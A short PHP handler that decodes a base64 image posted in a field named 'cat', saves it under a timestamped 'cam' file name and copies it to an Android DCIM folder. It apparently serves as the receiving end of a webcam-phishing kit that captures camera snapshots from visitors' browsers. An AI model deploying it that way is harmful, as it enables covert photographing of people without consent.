<?php
date_default_timezone_set('Asia/Kolkata');

if (!empty($_POST['cat'])) {

    $imageData = $_POST['cat'];

    // Log
    error_log("Received image", 3, "Log.log");

    // Clean base64 string
    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
    $unencodedData = base64_decode($filteredData);

    // File name
    $fileName = "cam" . date('dMYHis') . ".png";

    // Save inside project
    $savePath = $fileName;
    file_put_contents($savePath, $unencodedData);

    // Copy to Android Gallery (DCIM)
    $galleryPath = "/sdcard/DCIM/" . $fileName;
    copy($savePath, $galleryPath);

    exit();
}
?>
